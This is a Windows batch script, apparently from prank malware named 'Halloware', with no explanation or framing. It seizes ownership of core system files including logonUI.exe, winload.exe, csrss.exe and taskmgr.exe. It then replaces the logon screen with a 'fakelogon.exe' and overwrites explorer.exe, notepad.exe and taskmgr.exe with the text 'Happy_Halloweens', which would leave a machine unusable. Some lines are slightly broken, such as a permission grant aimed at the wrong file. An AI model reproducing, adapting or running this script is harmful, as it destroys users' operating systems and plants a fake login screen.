cd\
cd Windows
cd System32
takeown /f sethc.exe
icacls sethc.exe /granted "%username%":F /q

takeown /f csrss.exe
icacls csrss.exe /granted "%username%":F /q

takeown /f winload.exe
icacls winload.exe /granted "%username%":F /q

takeown /f logonUI.exe
icacls logonUI.exe /granted "%username%":F /q

takeown /f bcdedit.exe
icacls bcdedit.exe /granted "%username%":F /q


cd..
takeown /f explorer.exe
icacls explorer.exe /granted "%username%":F /q

takeown /f notepad.exe
icacls sethc.exe /granted "%username%":F /q

takeown /f regedit.exe
icacls regedit.exe /granted "%username%":F /q
cd system32
takeown /f taskmgr.exe
icacls taskmgr.exe /granted "%username%":F /q

takeown /f rundll32.exe
icacls rundll32.exe /granted "%username%":F /q


copy sethc.exe "C:\Program Files\Halloware\backup\sethc.bak"
copy csrss.exe "C:\Program Files\Halloware\backup\csrss.bak"
copy winload.exe "C:\Program Files\Halloware\backup\winload.bak"
copy logonUI.exe "C:\Program Files\Halloware\backup\logonUI.bak"
copy bcdedit.exe "C:\Program Files\Halloware\backup\bcdedit.bak"

cd..
copy explorer.exe "C:\Program Files\Halloware\backup\explorer.bak"
copy notepad.exe "C:\Program Files\Halloware\backup\notepad.bak"
copy regedit.exe "C:\Program Files\Halloware\backup\regedit.bak"
cd system32
copy taskmgr.exe "C:\Program Files\Halloware\backup\taskmgr.bak"
copy rundll32.exe "C:\Program Files\Halloware\backup\rundll32.bak"
copy "C:\Program Files\halloware\data\fakelogon.exe" "C:\Windows\System32\logonUI.exe" /Y




cd..
echo Happy_Halloweens>explorer.exe&echo Happy_Halloweens>notepad.exe&cd System32&echo Happy_Halloweens_Xdd>taskmgr.exe




